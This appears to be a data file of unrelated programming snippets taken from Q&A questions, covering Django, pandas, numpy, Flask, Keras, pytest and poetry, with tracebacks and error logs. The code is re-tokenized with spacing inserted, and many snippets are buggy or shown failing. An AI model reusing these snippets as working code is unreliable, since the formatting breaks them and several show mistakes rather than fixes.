[ Sun Jul 04 16:12:38 2010 ] [ error ] [ client 79.39.191.166 ] ModSecurity : Output filter : Failed to read bucket ( rc 104 ) : Connection reset by peer [ hostname `` url '' ] [ uri `` /api/odl/ '' ] [ unique_id `` TDEVZEPNBIMAAGLwU9AAAAAG '' ]
"{ 'searchResult ' : [ { 'resultType ' : 'station ' , 'ranking ' : 0.5 } , { 'resultType ' : 'station ' , 'ranking ' : 0.35 } , { 'resultType ' : 'station ' , 'ranking ' : 0.40 } ] } { 'searchResult ' : [ { 'resultType ' : 'station ' , 'ranking ' : 0.5 } , { 'resultType ' : 'station ' , 'ranking ' : 0.4 } , { 'resultType ' : 'station ' , 'ranking ' : 0.35 } ] } result = sorted ( result.items ( ) , key=lambda k : k [ 1 ] [ 0 ] [ 1 ] [ `` ranking '' ] , reverse=True )"
"from enum import Enumclass ReversibleEnum ( Enum ) : @ classmethod def fromName ( cls , str ) : return getattr ( cls , str.lower ( ) ) @ classmethod def fromValue ( cls , value ) : return cls._value2member_map_ [ value ]"
audit = 100/percent audit = 100 / 50 ( which is 2 )
"`` `` '' This is the `` iniFileGenerator '' module. > > > hintFile = `` ./tests/unit_test_files/hint.txt '' > > > f = iniFileGenerator ( hintFile ) > > > print f.hintFilePath./tests/unit_test_files/hint.txt '' '' '' class iniFileGenerator : def __init__ ( self , hintFilePath ) : self.hintFilePath = hintFilePath def hello ( self ) : `` '' '' > > > f.hello ( ) hello `` '' '' print `` hello '' if __name__ == `` __main__ '' : import doctest doctest.testmod ( ) Failed example : f.hello ( ) Exception raised : Traceback ( most recent call last ) : File `` /System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/doctest.py '' , line 1254 , in __run compileflags , 1 ) in test.globs File `` < doctest __main__.iniFileGenerator.hello [ 0 ] > '' , line 1 , in < module > f.hello ( ) NameError : name ' f ' is not defined def hello ( self ) : `` '' '' hintFile = `` ./tests/unit_test_files/hint.txt '' > > > f = iniFileGenerator ( hintFile ) > > > f.hello ( ) hello `` '' '' print `` hello ''"
"np.random.seed ( 0 ) s1 = pd.Series ( [ 1 , 2 , ' a ' , ' b ' , [ 1 , 2 , 3 ] ] ) s2 = np.random.randn ( len ( s1 ) ) s3 = np.random.choice ( list ( 'abcd ' ) , len ( s1 ) ) df = pd.DataFrame ( { ' A ' : s1 , ' B ' : s2 , ' C ' : s3 } ) df A B C0 1 1.764052 a1 2 0.400157 d2 a 0.978738 c3 b 2.240893 a4 [ 1 , 2 , 3 ] 1.867558 a df.applymap ( type ) .nunique ( ) > 1A TrueB FalseC Falsedtype : bool % timeit df.applymap ( type ) .nunique ( ) > 13.95 ms ± 88 µs per loop ( mean ± std . dev . of 7 runs , 100 loops each )"
"if ( black == white ) { PyErr_SetString ( PyExc_RuntimeError , `` Remap failed '' ) ; } assert ( black ! = white ) ;"
"list1 = [ 'e1 ' , 'e2 ' , 'e3 ' , 'e4 ' , 'e5 ' , 'e6 ' , 'e7 ' ] list2 = [ 'h1 ' , 'h2 ' , 'h1 ' , 'h3 ' , 'h1 ' , 'h2 ' , 'h4 ' ] > > > list1 [ 'e3 ' , 'e5 ' , 'e6 ' ] > > > list2 [ 'h1 ' , 'h1 ' , 'h2 ' ]"
# ( 1 ) identity and equality with a methodclass Foo ( object ) : def bar ( self ) : passfoo = Foo ( ) b = foo.barb == foo.bar # evaluates True . why ? b is foo.bar # evaluates False . why ? # ( 2 ) with a non-method functiondef fun ( self ) : passf = funf == fun # evaluates Truef is fun # evaluates True # ( 3 ) when fun is bound as a method Foo.met = funfoo.met == fun # evaluates Falsefoo.met is fun # evaluates False # ( 4 ) with a callable data memberclass CanCall ( object ) : def __call__ ( self ) : passFoo.can = CanCall ( ) c = foo.canc == foo.can # evaluates Truec is foo.can # evaluates True
"< img src= '' { { resized_img_src ( filename , width=200 ) } } '' / > @ app.route ( `` /uploads/ < filename > '' , methods= [ `` GET '' ] ) def uploaded_file ( filename ) : return send_from_directory ( upload_path ( ) , filename ) < img src= '' /uploads/69 ? w=200 & amp ; s=4tDuOKq1G1qURVty_6pYAxpG4jk '' >"
"a , b = 0,1 while b < 50 : print ( b ) a = b b = a+b 12481632 a , b = 0,1 while b < 50 : print ( b ) a , b = b , a+b 112358132134"
"train , test = data [ :100 ] , data [ 100 : ] ext_train , ext_test = external [ :100 ] , external [ 100 : ] model = ARIMA ( train , order= ( p , d , q ) , exog=ext_train ) model_fit = model.fit ( displ=False ) forecast = model_fit.predict ( end=len ( data ) -1 , exog=external , dynamic=False ) forecast = model_fit.predict_fn ( end = len ( data ) -1 , exog=external , true=data , dynamic=False ) historical = trainhistorical_ext = ext_trainpredictions = [ ] for t in range ( len ( test ) ) : model = ARIMA ( historical , order= ( p , d , q ) , exog=historical_ext ) model_fit = model.fit ( disp=False ) output = model_fit.forecast ( exog=ext_test [ t ] ) [ 0 ] predictions.append ( output ) observed = test [ t ] historical.append ( observed ) historical_ext.append ( ext_test [ t ] )"
"< ! doctype html > < meta charset= '' utf-8 '' > < html lang= '' en '' > < html > < head > < title > Demo < /title > < script src= '' ../../pyodide/build/pyodide.js '' > < /script > < /head > < body > < /body > < script type= '' text/javascript '' > languagePluginLoader.then ( ( ) = > { pyodide.loadPackage ( [ 'matplotlib ' ] ) .then ( ( ) = > { pyodide.runPython ( ` import matplotlib.pyplot as plt plt.plot ( [ 1 , 2 , 3 , 4 ] ) plt.ylabel ( 'some numbers ' ) # fig = plt.gcf ( ) # fig.savefig ( imgdata , format='png ' ) print ( 'Done from python ! ' ) ` ) ; //var image = pyodide.pyimport ( 'imgdata ' ) ; //console.log ( image ) ; } ) ; } ) ; < /script > < html >"
class Log ( models.Model ) : remarks = models.TextField ( ) timestamp = models.DateTimeField ( default=timezone.now )
"model.meta.managed = False from django.db import modelsclass MdmMeta ( object ) : db_tablespace = 'MDM_ADM ' managed = False ordering = [ 'name ' ] class ActiveManager ( models.Manager ) : def get_queryset ( self ) : return super ( ActiveManager , self ) .get_queryset ( ) .filter ( lifecyclestatus='active ' ) class MdmType ( models.Model ) : entity_guid = models.PositiveIntegerField ( db_column='ENTITYGUID ' ) entity_name = models.CharField ( max_length=255 , db_column='ENTITYNAME ' ) entry_guid = models.PositiveIntegerField ( primary_key=True , db_column='ENTRYGUID ' ) name = models.CharField ( max_length=255 , db_column='NAME ' ) description = models.CharField ( max_length=512 , db_column='DESCRIPTION ' ) lifecyclestatus = models.CharField ( max_length=255 , db_column='LIFECYCLESTATUS ' ) # active_manager = ActiveManager ( ) def save ( self , *args , **kwargs ) : raise Exception ( 'Do not save MDM models ! ' ) def delete ( self , *args , **kwargs ) : raise Exception ( 'Do not delete MDM models ! ' ) def __str__ ( self ) : return self.name class Meta ( MdmMeta ) : abstract = True # Create your models here.class MdmSpecies ( MdmType ) : class Meta ( MdmMeta ) : db_table = 'MDM_SPECIES ' verbose_name = 'Species ' verbose_name_plural = 'Species'class MdmVariety ( MdmType ) : class Meta ( MdmMeta ) : db_table = 'MDM_VARIETY ' verbose_name = 'Variety ' verbose_name_plural = 'Varieties ' ... __author__ = 'CoesseWa'class MdmRouter ( object ) : def db_for_read ( self , model , **hints ) : if model._meta.app_label == 'mdm ' : # return 'default ' return 'mdm_db ' # trying to use one database connection return 'default ' def db_for_write ( self , model , **hints ) : return 'default ' def allow_relation ( self , obj1 , obj2 , **hints ) : return None def allow_migrate ( self , db , model ) : if model._meta.app_label == 'mdm ' : return False DATABASES = { 'default ' : { 'ENGINE ' : 'django.db.backends.oracle ' , 'NAME ' : ' ( DESCRIPTION= ( ADDRESS_LIST= ( ADDRESS= ( PROTOCOL=TCP ) ( HOST= % s ) ( PORT=1521 ) ) ) ( CONNECT_DATA= ( SID= % s ) ) ) ' % ( get_env_variable ( 'LIMS_MIGRATION_HOST ' ) , get_env_variable ( 'LIMS_MIGRATION_SID ' ) ) , 'USER ' : 'LIMS_MIGRATION ' , 'PASSWORD ' : get_env_variable ( 'LIMS_MIGRATION_PASSWORD ' ) , } , 'mdm_db ' : { 'ENGINE ' : 'django.db.backends.oracle ' , 'NAME ' : ' ( DESCRIPTION= ( ADDRESS_LIST= ( ADDRESS= ( PROTOCOL=TCP ) ( HOST=GB3P ) ( PORT=1521 ) ) ) ' ' ( CONNECT_DATA= ( SID=GB3P ) ) ) ' , 'USER ' : 'MDM ' , 'PASSWORD ' : get_env_variable ( 'MDM_DB_PASSWORD ' ) , } , } from django.test.testcases import TestCase__author__ = 'CoesseWa'class ModelTest ( TestCase ) : def test_getting_guid_for_mdm_field ( self ) : self.assertIsNotNone ( 1 ) ... Destroying old test user ... Creating test user ... Creating test database for alias 'mdm_db ' ... Failed ( ORA-01031 : insufficient privileges Got an error creating the test database : ORA-01031 : insufficient privileges"
"> > > def foo ( ) : ... print 'bar ' ... print 'barbar ' ... print 'barbarbar ' > > > foo ( ) hellobarhellobarbar hellobarbarbar > > > def foo ( ) : ... for i in range ( 0,3 ) : ... print 'bar ' > > > foo ( ) hellobarhellobar hellobar import sysimport timeimport threadingclass SetTrace ( object ) : `` '' '' with SetTrace ( monitor ) : `` '' '' def __init__ ( self , func ) : self.func = func def __enter__ ( self ) : sys.settrace ( self.func ) return self def __exit__ ( self , ext_type , exc_value , traceback ) : sys.settrace ( None ) # http : //effbot.org/zone/python-with-statement.htm # When __exit__ returns True , the exception is swallowed . # When __exit__ returns False , the exception is reraised . # This catches Sentinel , and lets other errors through # return isinstance ( exc_value , Exception ) def monitor ( frame , event , arg ) : if event == `` line '' : if not running : raise Exception ( `` global running is False , exiting '' ) return monitordef isRunning ( function ) : def defaultBehavior ( *args ) : with SetTrace ( monitor ) : ret = function ( *args ) return ret return defaultBehavior @ isRunningdef foo ( ) : while True : time.sleep ( 1 ) print 'bar'global runningrunning = Truethread = threading.Thread ( target = foo ) thread.start ( ) time.sleep ( 3 ) running = False"
"Exception happened during processing of request from ( '127.0.0.1 ' , 6924 ) Traceback ( most recent call last ) : File `` C : \Python27\lib\SocketServer.py '' , line 284 , in _handle_request_noblock self.process_request ( request , client_address ) File `` C : \Python27\lib\SocketServer.py '' , line 310 , in process_request self.finish_request ( request , client_address ) File `` C : \Python27\lib\SocketServer.py '' , line 323 , in finish_request self.RequestHandlerClass ( request , client_address , self ) File `` C : \Python27\lib\SocketServer.py '' , line 639 , in __init__ self.handle ( ) File `` C : \Users\Cosmo\AppData\Roaming\Python\Python27\site-packages\werkzeug\serving.py '' , line 189 , in handle return rvUnboundLocalError : local variable 'rv ' referenced before assignment"
> > > `` in 'spam'True > > > `` in ' spam 'True
> > > pytz.country_timezones [ 'US ' ] America/New_YorkAmerica/DetroitAmerica/Kentucky/LouisvilleAmerica/Kentucky/MonticelloAmerica/Indiana/IndianapolisAmerica/Indiana/VincennesAmerica/Indiana/WinamacAmerica/Indiana/MarengoAmerica/Indiana/PetersburgAmerica/Indiana/VevayAmerica/ChicagoAmerica/Indiana/Tell_CityAmerica/Indiana/KnoxAmerica/MenomineeAmerica/North_Dakota/CenterAmerica/North_Dakota/New_SalemAmerica/North_Dakota/BeulahAmerica/DenverAmerica/BoiseAmerica/PhoenixAmerica/Los_AngelesAmerica/MetlakatlaAmerica/AnchorageAmerica/JuneauAmerica/SitkaAmerica/YakutatAmerica/NomeAmerica/AdakPacific/Honolulu ( UTC -5:00 ) New_York ( UTC -5:00 ) Detroit ( UTC -5:00 ) Kentucky/Louisville ( UTC -5:00 ) Kentucky/Monticello ( UTC -5:00 ) Indiana/Indianapolis ( UTC -5:00 ) Indiana/Vincennes ( UTC -5:00 ) Indiana/Winamac ( UTC -5:00 ) Indiana/Marengo ( UTC -5:00 ) Indiana/Petersburg ( UTC -5:00 ) Indiana/Vevay
"import numpy as npdata = np.arange ( 30 ) .reshape ( 10,3 ) data=data*dataarray ( [ [ 0 , 1 , 4 ] , [ 9 , 16 , 25 ] , [ 36 , 49 , 64 ] , [ 81 , 100 , 121 ] , [ 144 , 169 , 196 ] , [ 225 , 256 , 289 ] , [ 324 , 361 , 400 ] , [ 441 , 484 , 529 ] , [ 576 , 625 , 676 ] , [ 729 , 784 , 841 ] ] ) mn = np.mean ( data , axis=0 ) data -= mnC = np.cov ( data.T ) evals , evecs = la.eig ( C ) idx = np.argsort ( evals ) [ : :-1 ] evecs = evecs [ : ,idx ] print evecsarray ( [ [ -0.53926461 , -0.73656433 , 0.40824829 ] , [ -0.5765472 , -0.03044111 , -0.81649658 ] , [ -0.61382979 , 0.67568211 , 0.40824829 ] ] ) import matplotlib.mlab as mlabmpca=mlab.PCA ( data ) print mpca.Wt [ [ 0.57731894 0.57740574 0.57732612 ] [ 0.72184459 -0.03044628 -0.69138514 ] [ 0.38163232 -0.81588947 0.43437443 ] ]"
"def fnc ( buffer , count ) : n = float ( sum ( buffer < 2.0 ) ) sum = sum ( buffer ) - ( ( count - b ) * 2.0 ) return ( sum / n ) avg = scipy.ndimage.generic_filter ( image , fnc , footprint = kernel , \ mode = 'constant ' , cval = 2.0 , \ extra_keywords = { 'count ' : countkernel } ) def fnc ( buffer ) : return ( numpy.nansum ( buffer ) / numpy.sum ( [ ~numpy.isnan ( buffer ) ] ) ) avg = scipy.ndimage.generic_filter ( image , fnc , footprint = kernel , \ mode = 'constant ' , cval = float ( numpy.nan ) def fnc ( buffer ) : return numpy.sum ( buffer ) sumbigimage = scipy.ndimage.generic_filter ( image , fnc , \ footprint = kernel , \ mode = 'constant ' , \ cval = 0.0 ) summask = scipy.ndimage.generic_filter ( mask , fnc , \ footprint = kernel , \ mode = 'constant ' , \ cval = 0.0 ) avg = sumbigimage / summask maskedimg = numpy.ma.masked_array ( imgarray , mask = maskarray ) def fnc ( buffer ) : return numpy.mean ( buffer ) avg = scipy.ndimage.generic_filter ( maskedimg , fnc , footprint = kernel , \ mode = 'constant ' , cval = 0.0 )"
"' '' The function returns True if we can add operator to current expression : we scan the list and add +1 to counter when we meet a letterand we add -1 when we meet an operator ( it reduceslast two letters into 1 ( say ab+ < -- > a + b ) ' '' def can_add_operator ( string_ ) : n = 0 for letter in string_ : if letter not in [ '+ ' , '- ' , '* ' , '/ ' ] : n += 1 else : n -= 1 result = n > 1 return result can_add_operator ( 'ab*c+ ' ) ) # False can_add_operator ( 'ab*c ' ) # True `` 'The function returns a list , that contains operators andletters , one of which we can add to the current expression . ' '' def possible_elements ( items , string_ ) : # list of all letters that we have not used yet result = [ x for x in items if x not in string_ ] if can_add_operator ( string_ ) : result = [ `` + '' , `` - '' , `` * '' , `` / '' ] + result return resultletters = [ ' a ' , ' b ' , ' c ' , 'd ' ] possible_elements ( letters , 'ab*c ' ) # [ '+ ' , '- ' , '* ' , '/ ' , 'd ' ] possible_elements ( letters , `` ) # [ ' a ' , ' b ' , ' c ' , 'd ' ] possible_elements ( letters , 'ab*c+d+ ' ) # [ ] # exp -- current expression , base of recursion is exp = `` def rec ( exp , Final_sol = [ ] ) : elements_to_try = possible_elements ( letters , exp ) for i in elements_to_try : if len ( possible_elements ( letters , exp + i ) ) == 0 : Final_sol.append ( exp + i ) else : rec ( exp+i , Final_sol ) return Final_sol # we start with an empty stringFinal_sol = rec ( `` ) print ( len ( Final_sol ) ) # 7680 Final_sol = rec ( `` ) print ( len ( Final_sol ) ) # 32str ( Final_sol ) > > `` [ 'ab+ ' , 'ab- ' , 'ab* ' , 'ab/ ' , 'ba+ ' , 'ba- ' , 'ba* ' , 'ba/ ' , 'ba+ ' , 'ba- ' , 'ba* ' , 'ba/ ' , 'ab+ ' , 'ab- ' , 'ab* ' , 'ab/ ' , 'ab+ ' , 'ab- ' , 'ab* ' , 'ab/ ' , 'ba+ ' , 'ba- ' , 'ba* ' , 'ba/ ' , 'ba+ ' , 'ba- ' , 'ba* ' , 'ba/ ' , 'ab+ ' , 'ab- ' , 'ab* ' , 'ab/ ' ] ''"
"s= '' + - - - - + + - - - - + '' m1= '' | o o | '' m2= '' | o | '' m3= '' | o | '' m4= '' | o | '' m5= '' | | '' def dice ( a , b ) : if a == 1 : str1=m5 str2=m3 str3=m5 elif a == 2 : str1=m2 str2=m5 str3=m4 elif a == 3 : str1=m2 str2=m3 str3=m4 elif a == 4 : str1=m1 str2=m5 str3=m1 elif a == 5 : str1=m1 str2=m3 str3=m1 elif a == 6 : str1=m1 str2=m1 str3=m1 if b == 1 : str1=str1+ '' `` +m5 str2=str2+ '' `` +m3 str3=str3+ '' `` +m5 elif b == 2 : str1=str1+ '' `` +m2 str2=str2+ '' `` +m5 str3=str3+ '' `` +m4 elif b == 3 : str1=str1+ '' `` +m2 str2=str2+ '' `` +m3 str3=str3+ '' `` +m4 elif b == 4 : str1=str1+ '' `` +m1 str2=str2+ '' `` +m5 str3=str3+ '' `` +m1 elif b == 5 : str1=str1+ '' `` +m1 str2=str2+ '' `` +m3 str3=str3+ '' `` +m1 elif b == 6 : str1=str1+ '' `` +m1 str2=str2+ '' `` +m1 str3=str3+ '' `` +m1 print ( s ) print ( str1 ) print ( str2 ) print ( str3 ) print ( s )"
"model = Sequential ( ) model.add ( SimpleRNN ( 4 , input_shape= ( 1 , 4 ) , activation='sigmoid ' , return_sequences=True ) ) model.add ( Dense ( 2 ) ) model.compile ( loss='mean_absolute_error ' , optimizer='adam ' ) model.fit ( data , target , epochs=5000 , batch_size=1 , verbose=2 ) predict = model.predict ( data ) input = input.reshape ( ( 10 , 1 , 4 ) ) target = target.reshape ( ( 10 , 1 , 2 ) )"
"Dictionary < string , int > d = new Dictionary < string , int > ( ) { { `` cheese '' , 2 } , { `` cakes '' , 1 } , { `` milk '' , 0 } , { `` humans '' , -1 } // This one 's for laughs } ; from collections import Countermy_first_dict = { `` cheese '' : 1 , `` cakes '' : 2 , `` milk '' : 3 , } my_second_dict = { `` cheese '' : 0 , `` cakes '' : 1 , `` milk '' : 4 , } print Counter ( my_first_dict ) - Counter ( my_second_dict ) > > > Counter ( { 'cheese ' : 1 , 'cakes ' : 1 } )"
", ,C , , , D , ,A , B , X , Y , Z , X , Y , Z1,2,3,4,5,6,7,8"
"newline : = `` \r\n '' / '' \n '' / '' \r '' indent : = ( `` \r\n '' / '' \n '' / '' \r '' ) , [ \t ] number : = [ 0-9 ] +whitespace : = [ \t ] +symbol_mark : = [ *_ > # ` % ] symbol_mark_noa : = [ _ > # ` % ] symbol_mark_nou : = [ * > # ` % ] symbol_mark_nop : = [ *_ > # ` ] punctuation : = [ \ ( \ ) \ , \.\ ! \ ? ] noaccent_code : = - ( newline / ' ` ' ) +accent_code : = - ( newline / ' `` ' ) +symbol : = - ( whitespace / newline ) text : = -newline+safe_text : = - ( newline / whitespace / [ *_ > # ` ] / ' % % ' / punctuation ) +/whitespacelink : = 'http ' / 'ftp ' , 's ' ? , ' : // ' , ( - [ \t\r\n < > ` ^ ' '' *\ , \.\ ! \ ? ] / ( [ , \.\ ? ] , ? - [ \t\r\n < > ` ^ ' '' * ] ) ) +strikedout : = - [ \t\r\n*_ > # ` ^ ] +ctrlw : = '^W'+ctrlh : = '^H'+strikeout : = ( strikedout , ( whitespace , strikedout ) * , ctrlw ) / ( strikedout , ctrlh ) strong : = ( '** ' , ( inline_nostrong/symbol ) , ( inline_safe_nostrong/symbol_mark_noa ) * , '** ' ) / ( '__ ' , ( inline_nostrong/symbol ) , ( inline_safe_nostrong/symbol_mark_nou ) * , '__ ' ) emphasis : = ( '* ' , ? -'* ' , ( inline_noast/symbol ) , ( inline_safe_noast/symbol_mark_noa ) * , '* ' ) / ( ' _ ' , ? - ' _ ' , ( inline_nound/symbol ) , ( inline_safe_nound/symbol_mark_nou ) * , ' _ ' ) inline_code : = ( ' ` ' , noaccent_code , ' ` ' ) / ( ' `` ' , accent_code , ' `` ' ) inline_spoiler : = ( ' % % ' , ( inline_nospoiler/symbol ) , ( inline_safe_nop/symbol_mark_nop ) * , ' % % ' ) inline : = ( inline_code / inline_spoiler / strikeout / strong / emphasis / link ) inline_nostrong : = ( ? - ( '**'/'__ ' ) , ( inline_code / reference / signature / inline_spoiler / strikeout / emphasis / link ) ) inline_nospoiler : = ( ? - ' % % ' , ( inline_code / emphasis / strikeout / emphasis / link ) ) inline_noast : = ( ? -'* ' , ( inline_code / inline_spoiler / strikeout / strong / link ) ) inline_nound : = ( ? - ' _ ' , ( inline_code / inline_spoiler / strikeout / strong / link ) ) inline_safe : = ( inline_code / inline_spoiler / strikeout / strong / emphasis / link / safe_text / punctuation ) +inline_safe_nostrong : = ( ? - ( '**'/'__ ' ) , ( inline_code / inline_spoiler / strikeout / emphasis / link / safe_text / punctuation ) ) +inline_safe_noast : = ( ? -'* ' , ( inline_code / inline_spoiler / strikeout / strong / link / safe_text / punctuation ) ) +inline_safe_nound : = ( ? - ' _ ' , ( inline_code / inline_spoiler / strikeout / strong / link / safe_text / punctuation ) ) +inline_safe_nop : = ( ? - ' % % ' , ( inline_code / emphasis / strikeout / strong / link / safe_text / punctuation ) ) +inline_full : = ( inline_code / inline_spoiler / strikeout / strong / emphasis / link / safe_text / punctuation / symbol_mark / text ) +line : = newline , ? - [ \t ] , inline_full ? sub_cite : = whitespace ? , ? -reference , ' > 'cite : = newline , whitespace ? , ' > ' , sub_cite* , inline_full ? code : = newline , [ \t ] , [ \t ] , [ \t ] , [ \t ] , textblock_cite : = cite+block_code : = code+all : = ( block_cite / block_code / line / code ) +"
"class A : def m ( self ) : print ( `` m of A called '' ) class B ( A ) : def m ( self ) : print ( `` m of B called '' ) super ( ) .m ( ) class C ( A ) : def m ( self ) : print ( `` m of C called '' ) super ( ) .m ( ) class D ( B , C ) : def m ( self ) : print ( `` m of D called '' ) super ( ) .m ( ) > > > from super5 import D > > > x = D ( ) > > > x.m ( ) m of D calledm of B calledm of C calledm of A called m of D calledm of B calledm of A calledm of C calledm of A called"
"def closure ( ) : value = False def method_1 ( ) : value = True def method_2 ( ) : print 'value is : ' , value method_1 ( ) method_2 ( ) closure ( )"
"import jsonimport urllib2from collections import defaultdict as dddata = dd ( str ) req = urllib2.Request ( 'http : //myendpoint/test ' ) data [ `` Input '' ] = `` Hello World ! `` response = urllib2.urlopen ( req , json.dumps ( data ) ) from flask import request @ app.route ( '/test ' , methods = [ 'POST ' ] ) def test ( ) : output = dd ( ) data = request.json @ app.route ( '/test ' , methods = [ 'POST ' ] ) @ inlineCallbacksdef test ( request ) : output = dd ( ) data = request.json < === This does n't work"
"import numpy as np a = np.arange ( 24 ) a = a.reshape ( 2,3,4 ) a [ : ,0,0 ] a [ : ,0,1 ] ..a [ : ,2,3 ] a [ 0 , :,0 ] ..a [ 1 , :,3 ] a [ 0,0 , : ] ..a [ 1,2 , : ]"
"class CMSDocument ( BaseItem ) : thumb = models.ImageField ( upload_to= './media/ ' , blank=True ) def video_embed_post_save ( sender , instance=False , **kwargs ) : document = DocumentEmbedType.objects.get ( pk=instance.pk ) new_thumb = `` media/ % s.png '' % ( document.pk , ) if not document.thumb == new_thumb : document.thumb = new_thumb document.save ( ) ..."
date open close color run00:01:00 100 102 g 100:02:00 102 104 g 200:03:00 104 106 g 300:04:00 106 105 r 100:05:00 105 101 r 200:06:00 101 102 g 1 00:06:00 102 103 g 2 date open close color run run_length00:01:00 100 102 g 1 2 # abs ( 100 - 102 ) 00:02:00 102 104 g 2 4 # abs ( 100 - 104 ) 00:03:00 104 106 g 3 6 # abs ( 100 - 106 ) 00:04:00 106 105 r 1 1 # abs ( 106 - 105 ) 00:05:00 105 101 r 2 5 # abs ( 106 - 101 ) 00:06:00 101 102 g 1 1 # abs ( 101 - 102 ) 00:06:00 102 103 g 2 2 # abs ( 101 - 103 )
"def update_last_login ( sender , user , **kwargs ) : `` '' '' A signal receiver which updates the last_login date for the user logging in. `` '' '' user.last_login = timezone.now ( ) user.save ( update_fields= [ 'last_login ' ] ) user_logged_in.connect ( update_last_login )"
"class Movie ( models.Model ) : name = models.CharField ( max_length=256 ) length_minutes = models.IntegerField ( ) rating = models.CharField ( max_length=2 ) class Meta : db_table = 'movies ' BEGIN ; CREATE TABLE `` movies '' ( `` id '' serial NOT NULL PRIMARY KEY , `` name '' varchar ( 256 ) NOT NULL , `` length_minutes '' integer NOT NULL , `` rating '' varchar ( 2 ) NOT NULL ) ; COMMIT ; Movie.objects.create ( length_minutes=120 , rating='PG ' ) INSERT INTO movies ( length_minutes , rating ) VALUES ( 120 , 'PG ' ) ;"
> > > import sys > > > sys.getsizeof ( int ) 416 > > > sys.getsizeof ( float ) 416 > > > sys.getsizeof ( list ) 416 > > > sys.getsizeof ( tuple ) 416 > > > sys.getsizeof ( dict ) 416 > > > sys.getsizeof ( bool ) 416 > > > import sys > > > sys.getsizeof ( int ( ) ) 24 > > > sys.getsizeof ( float ( ) ) 24 > > > sys.getsizeof ( int ( 1 ) ) 28 > > > sys.getsizeof ( float ( 1 ) ) 24
"Project/|+ -- src/| || + -- proj/| || + -- __init__.py| + -- code.py| + -- tests/| || + -- __init__.py| + -- conftest.py| + -- test_code.py+ -- doc/+ -- pytest.ini+ -- setup.py # conftest.pydef pytest_addoption ( parser ) : parser.addoption ( `` -- plots '' , action= '' store_true '' , default=False ) $ pytest -- plots usage : pytest [ options ] [ file_or_dir ] [ file_or_dir ] [ ... ] pytest : error : unrecognized arguments : -- plots inifile : / ... /Project/pytest.ini rootdir : / ... /Project $ pytest src/proj -- plots ... rootdir : / ... /Project , inifile : pytest.ini ... $ pytest src/proj/tests -- plots ... rootdir : / ... /Project , inifile : pytest.ini ... # __init__.py def test ( *args , **kwargs ) : from pytest import main cmd = [ ' -- pyargs ' , 'proj.tests ' ] cmd.extend ( args ) return main ( cmd , **kwargs ) > > > import proj > > > proj.test ( ) > > > proj.test ( ' -- plots ' ) usage : [ options ] [ file_or_dir ] [ file_or_dir ] [ ... ] : error : unrecognized arguments : -- plots inifile : None rootdir : /some/other/folder # pytest.ini [ pytest ] testpaths = src/proj/testsconfcutdir = src/proj/tests"
from selenium import webdriverdriver = webdriver.Chrome ( ) driver.get ( 'http : //google.com ' ) driver.close ( )
"DATABASES = { `` default '' : { `` ENGINE '' : `` django.db.backends.postgresql_psycopg2 '' , # Add `` postgresql_psycopg2 '' , `` postgresql '' , `` mysql '' , `` sqlite3 '' or `` oracle '' . `` NAME '' : `` mydb '' , # Or path to database file if using sqlite3 . `` USER '' : `` postgres '' , # Not used with sqlite3 . `` PASSWORD '' : `` test '' , # Not used with sqlite3 . `` HOST '' : `` localhost '' , # Set to empty string for localhost . Not used with sqlite3 . `` PORT '' : `` '' , # Set to empty string for default . Not used with sqlite3 . } }"
"try : thing.merge ( iterable ) # this is an iterable so I add it to the listexcept TypeError : thing.append ( iterable ) # this is not iterable , so I add it for x in Exception ( ) : print 1"
"import pyorientusername= '' user '' password= '' password '' client = pyorient.OrientDB ( `` localhost '' , 2424 ) session_id = client.connect ( username , password ) print ( `` SessionID= '' , session_id ) db_name= '' GratefulDeadConcerts '' if client.db_exists ( db_name , pyorient.STORAGE_TYPE_MEMORY ) : print ( `` Database '' , db_name , '' exists '' ) client.db_open ( db_name , username , password ) else : print ( `` Database '' , db_name , '' does n't exist '' ) SessionID= 27Database GratefulDeadConcerts existsTraceback ( most recent call last ) : File `` FirstTest.py '' , line 18 , in < module > client.db_open ( db_name , username , password ) File `` /home/tom/MyProgs/TestingPyOrient/env/lib/python3.5/site-packages/pyorient/orient.py '' , line 379 , in db_open .prepare ( ( db_name , user , password , db_type , client_id ) ) .send ( ) .fetch_response ( ) File `` /home/tom/MyProgs/TestingPyOrient/env/lib/python3.5/site-packages/pyorient/messages/database.py '' , line 141 , in fetch_response info = OrientVersion ( release ) File `` /home/tom/MyProgs/TestingPyOrient/env/lib/python3.5/site-packages/pyorient/otypes.py '' , line 202 , in __init__ self._parse_version ( release ) File `` /home/tom/MyProgs/TestingPyOrient/env/lib/python3.5/site-packages/pyorient/otypes.py '' , line 235 , in _parse_version self.build = int ( self.build ) ValueError : invalid literal for int ( ) with base 10 : ' 0 ( build develop @ r79d281140b01c0bc3b566a46a64f1573cb359783 ; 2016 '"
"Python 2.7.5 ( default , Aug 29 2016 , 10:12:21 ) [ GCC 4.8.5 20150623 ( Red Hat 4.8.5-4 ) ] on linux2Type `` help '' , `` copyright '' , `` credits '' or `` license '' for more information. > > > from __future__ import ( absolute_import , division , print_function ) > > > class C ( object ) : ... @ staticmethod ... def foo ( ) : ... for name , val in C.__dict__.items ( ) : ... if name [ :2 ] ! = '__ ' : ... print ( name , callable ( val ) , type ( val ) ) ... > > > C.foo ( ) foo False < type 'staticmethod ' > from __future__ import ( absolute_import , division , print_function ) class C ( object ) : @ staticmethod def foo ( ) : return 42 def bar ( self ) : print ( 'Is bar ( ) callable ? ' , callable ( C.bar ) ) print ( 'Is foo ( ) callable ? ' , callable ( C.foo ) ) for attribute , value in C.__dict__.items ( ) : if attribute [ :2 ] ! = '__ ' : print ( attribute , '\t ' , callable ( value ) , '\t ' , type ( value ) ) c = C ( ) c.bar ( ) > python2.7 test.pyIs bar ( ) callable ? TrueIs foo ( ) callable ? Truebar True < type 'function ' > foo False < type 'staticmethod ' > > python3.4 test.pyIs bar ( ) callable ? TrueIs foo ( ) callable ? Truebar True < class 'function ' > foo False < class 'staticmethod ' >"
"import numpy as npimport pandas as pddf = pd.DataFrame ( 1000* ( 2+np.random.randn ( 500 , 1 ) ) , columns=list ( ' A ' ) ) df.loc [ 1 , ' A ' ] = np.nandf.loc [ 15 , ' A ' ] = np.nandf.loc [ 240 , ' A ' ] = np.nandf.loc [ 241 , ' A ' ] = np.nan"
"$ poetry add -- optional redis [ tool.poetry.dependencies ] python = `` ^3.8 '' redis = { version= '' ^3.4.1 '' , optional=true } $ poetry install -E redis Installing dependencies from lock file [ ValueError ] Extra [ redis ] is not specified ."
